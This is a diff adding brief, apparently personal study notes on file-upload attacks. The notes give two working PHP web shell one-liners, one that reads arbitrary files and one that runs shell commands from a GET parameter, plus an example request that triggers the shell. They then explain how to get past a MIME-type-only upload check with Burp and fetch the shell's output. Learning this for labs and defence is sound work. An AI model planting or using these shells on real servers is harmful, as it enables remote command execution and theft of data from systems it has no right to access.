@@ -1,0 +1,14 @@
+All examples fo web shells:
+
+<?php echo file_get_contents('/path/to/target/file'); ?>
+
+<?php echo system($_GET['command']); ?>
+
+GET /example/exploit.php?command=id HTTP/1.1
+
+basically if the only validation is the system looking at the MIME type
+then on burp we can change the contents of the input to one of these injections^^
+and use the POST 
+
+then reading the .php file we will get what we want using the GET HTTP response
+the application uses to show the image
